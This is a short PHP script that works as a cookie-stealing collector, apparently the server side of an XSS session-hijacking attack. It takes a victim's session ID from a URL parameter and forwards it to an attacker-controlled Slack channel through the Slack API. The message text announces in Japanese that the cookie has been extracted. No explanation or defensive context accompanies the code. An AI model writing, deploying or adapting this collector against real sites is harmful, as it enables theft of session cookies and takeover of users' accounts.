<?php
$sid = $_GET['sid'];
$appToken = getenv('SLACK_APP_TOKEN');
$channelId = getenv('SLACK_CHANNEL_ID');

if (!empty($sid)) {

    $message = 'cookieを抜き取りました
' . $sid;
    $option = array(
        CURLOPT_URL => 'https://slack.com/api/chat.postMessage',
        CURLOPT_HTTPHEADER => array('Content-Type: application/x-www-form-urlencoded;charset=UTF-8'),
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => http_build_query(array('text' => $message, 'token' => $appToken, 'channel' => $channelId, 'parse' => 'none'))
    );

    $ch = curl_init();
    curl_setopt_array($ch, $option);
    $result = json_decode(curl_exec($ch), true);
    curl_close($ch);

}

?>